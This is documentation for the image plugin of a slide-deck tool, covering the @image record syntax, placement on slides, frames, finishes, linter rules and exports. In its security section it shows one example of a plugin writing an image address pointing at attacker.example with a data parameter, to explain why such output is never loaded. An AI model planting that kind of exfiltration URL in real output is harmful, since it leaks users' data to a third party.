# image

A picture, written in inline code on a line of its own:

```markdown
`@image{sample:photo-wide.jpg, title="Q3 offsite", description="The field team at Lake Louise, site 14 of 40.", frame=mat, nimbus}`
```

Markdown's own image is the same picture with nothing set: `![Q3 offsite](sample:photo-wide.jpg "The field team at Lake Louise")`
is `@image{sample:photo-wide.jpg, title="Q3 offsite", description="The field team at Lake Louise"}`. Every editor, GitHub and every
Markdown tool still shows it. Write the record when you want a frame, a finish, a tone or a size.

The record describes the picture. The slide places it:

| The slide | The picture becomes |
|---|---|
| an `image` slide | the layout's photo panel; the layout picks the composition from the photo's shape. `mirror` puts it on the left |
| a slide with `bleed` | the slide's background, cropped to fill it. The words pick their ink from the photo: white over a dark photo, dark over a light one, with a scrim or a veil under the heading (a Marp bundle gets the ink only: Marp draws the photo itself). A slide whose own class names a color mode keeps it |
| a `collage` | one of the tiles it packs (a list of records or Markdown images) |
| any other slide | a figure in the slide's flow, sized by the record |

This is a **plugin** (`engineering/decisions/2026-09-27-plugin-system.md`), on by default. Design:
`engineering/decisions/2026-10-16-media-plugins.md`.

## The record

```markdown
`@image{ADDRESS, title="…", description="…", focus=…, sm|md|lg, frame=…, nimbus|halo|meridian, duotone|grayscale, show=…}`
```

| Word | Meaning |
|---|---|
| the address | First, required: a path beside the deck, a `sample:` name (Lattice's sample art), an `asset:` name (a photo in the Studio Library), or a web address. Quote it when it holds `=`, `,` or a space. |
| `title="…"` | What the picture is called. It names the picture for a screen reader and the tooltip, and narration speaks it. Hidden on the slide unless `show=` asks for it: the slide's heading already sets the context. Without a title the picture is decorative, so a screen reader skips it rather than reading a file name. |
| `description="…"` | What it shows, in a sentence or two: for the tooltip, the print notes and narration, after the title. |
| `focus=…` | `top`, `bottom`, `left`, `right` or `center`: the part that must stay in view when a layout crops the picture. |
| `sm` `md` `lg` | The picture's size, `md` by default: a nudge of about a fifth either way, never past the box the slide gives it, and never so small it cannot be seen. |
| `frame=…` | `mat` (a gallery mat), `keyline` (one accent hairline), `float` (lifted on a soft shadow), `device` (a screen bezel) or `corners` (registration brackets). Bare or as `frame=mat`. None by default. |
| `nimbus` `halo` `meridian` | A finish: the deck's own looks as a light layer over the photograph. A strength follows the name: `nimbus=40`, from `20` to `80` and `full`. Alone, each takes a strength tuned for photographs. |
| `duotone` `grayscale` | A tone: the picture in two of the deck's colors, or in grays. Full unless the record says `duotone=60`. |
| `show=…` | Which words the slide shows under the picture: `none` (the default for a picture), `title`, or `all`. Hidden words still reach a screen reader, the tooltip, the print notes and narration. |

One finish and one tone at a time; two finishes leave the record as code, and `lint:deck` says why. The record goes on a
line of its own, with a blank line above and below. For a picture inside a sentence, write Markdown's `![title](src)`.

**Markdown's picture is the shortcut.** On a slide that places a picture (an `image` slide, `image mirror`, a `bleed` slide),
`![title](src "description")` alone on its line is placed exactly as the record is: the same panel or background, the same
words for a screen reader. Anywhere else it stays an ordinary picture; write the record when you want a frame, a finish, a
tone, a size or `show=`. Both forms take a `sample:` or `asset:` name, a path beside the deck, or an `https:` address.

It is placed only when it is the slide's one lone picture and the slide places no photo another way. A second lone picture,
a `![bg]`, a record or a `backgroundImage` directive on the same slide keeps it in the text (a `backgroundColor` does not),
as does a picture inside a list or a quote, an `http:` address (the record refuses it), or an alt that starts with Marp's
`bg` keyword. The engine, Export-to-Marp, the Studio and the linter all ask one rule for this, `lib/core/placed-picture.mjs`.

## Setting it for the whole deck

The `image:` register sets any of these once, the way `icon:` and `avatar:` do:

```markdown
---
image: mat nimbus=40
---
```

A slide's own class overrides the deck (`<!-- _class: content image-keyline -->`), and a record's own word overrides both. A
layout that places the picture itself (a collage tile, a `bleed` background, the `image` slide's panel) decides its frame and
size, so those words have nothing to act on there; each layout's guide says what it decides, in its "Media inside" section.

## Where the address can point

| Address | Example | Notes |
|---|---|---|
| A path | `photos/team.jpg` | Beside the deck. A path that leaves the deck's folder draws the stand-in. |
| `sample:` | `sample:photo-wide.jpg` | Lattice's sample art (`lib/samples/README.md`): for trying a layout before you have the photo. |
| `asset:` | `asset:offsite-14` | A photo in the Studio Library. In the CLI, a file named so in `assets/` beside the deck. |
| A web address | `https://…/team.jpg` | Shown only after the reader allows web pictures; until then, a placeholder. `lint:deck` warns (`image-web-source`). |

## In an export

PDF, PNG and PowerPoint draw the picture with its frame, finish and tone. The HTML player and the Studio draw the same.
Export-to-Marp writes the picture in Marp's own spelling (`![bg](…)` on an `image` or `bleed` slide, `![title](src)` elsewhere);
the frame, finish, tone and size do not cross, and the bundle's README says so.

## The address comes only from the record

Nothing in this plugin reads a slide's text or its rendered page. The engine reads the address from your own `@image{…}`
span, or your own `![…](…)` image, while it parses the Markdown. A zip plugin's drawing is text on the slide, so a plugin that
wrote `@image{https://attacker.example/?d=…}` into its output gets no picture from Lattice: the record is never redrawn from a
finished page, and every picture, a plugin's own included, still waits for the reader's consent before it loads from the web.

## What the linter says

| Rule | When |
|---|---|
| `image-marp-keyword` | A Marp `![bg …](…)` line. Retired: `--fix` rewrites it into Markdown's picture, `![title](src)`, which the slide places as it would the record, and moves its placement to the slide (`left` becomes `mirror`; on a slide that is not an `image` slide, the slide gains `bleed`). |
| `image-not-alone` | A record in running text, which stays code. |
| `image-extra-panel` | A second photo on a slide that seats one: a second record, which lands over the first, or two `![title](src)` pictures on lines of their own, so neither becomes the photo. |
| `image-web-source` | A picture from another site. Save it beside the deck instead. |
| `unknown-image` | A word the `image:` register does not know. |

## Words over a full-bleed photo

A `bleed` slide reads the band of its photo under the heading, cropped as the slide crops it, and gives its words the ink
that reads better there: the theme's `dark` mode (white words, a scrim darkening the top) over a dark photo, its light mode,
written `color-light` (dark words, a veil lightening the top), over a light one. A layout that centers its words (`divider`,
`title`, `closing`, `quote`, `big-number`) reads the middle of the photo instead. Name `dark`, `light` or
`color-light` in the slide's own class (or a carried `class:`) to choose for yourself; a deck-wide color mode does not count as
a choice about one photo, and a `print` deck keeps print's ink. Every export makes the same choice: the CLI reads
the file before its page renders, the Studio and the Playground read it in the preview, and an Export-to-Marp bundle carries
it in the slide's class. A bundle carries the ink only, not the scrim or the veil: Marp draws the photo as its own
background, outside the slide's panel they sit on, so over a busy bright photo a bundle's small type reads fainter than the
PDF's. A web picture the export cannot read keeps the theme's ink. `examples/bleed-auto-ink.md` shows each
case.

## What stays literal

A record in running text, in a code fence, or with words that contradict each other stays code. To show a record as text on
purpose, put a backslash before the `@`: `` `\@image{photo.jpg}` ``.

## Anti-patterns

- **Placement in the record.** `@image{x.jpg, left, 40%}` is not a thing: the slide places the picture. Use the `image` slide
  (with `mirror` for the left), `bleed`, or a layout that seats pictures.
- **A caption that repeats the heading.** Leave the title hidden (the default) when the heading already says it.
- **A finish to rescue a weak photo.** A finish belongs to the deck's look; a photo that needs one to be legible needs a better
  photo.
- **`grayscale` for "less important".** A tone is a look, not a hierarchy; the layout carries emphasis.
